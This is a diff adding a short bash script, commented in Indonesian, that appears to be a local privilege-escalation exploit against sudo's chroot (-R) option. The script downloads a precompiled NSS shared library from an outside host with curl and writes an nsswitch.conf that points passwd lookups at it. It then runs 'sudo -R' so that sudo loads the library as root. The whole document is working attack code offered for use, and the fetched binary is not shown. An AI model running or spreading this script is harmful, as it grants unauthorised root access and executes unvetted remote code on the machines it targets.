@@ -1,0 +1,21 @@
+#!/bin/bash
+
+# Buat direktori sementara
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd "${STAGE?}" || exit 1
+
+# Download versi precompiled .so (libnss_woot1337.so.2)
+mkdir -p libnss_
+curl -sL -o libnss_/woot1337.so.2 https://malamminggumiko.xyz/localroot/woot1337.so.2
+
+# Setup environment
+mkdir -p woot/etc
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc
+
+# Jalankan sudo -R
+echo "[+] Running sudo with custom NSS..."
+sudo -R woot woot
+
+# Cleanup
+rm -rf "${STAGE?}"
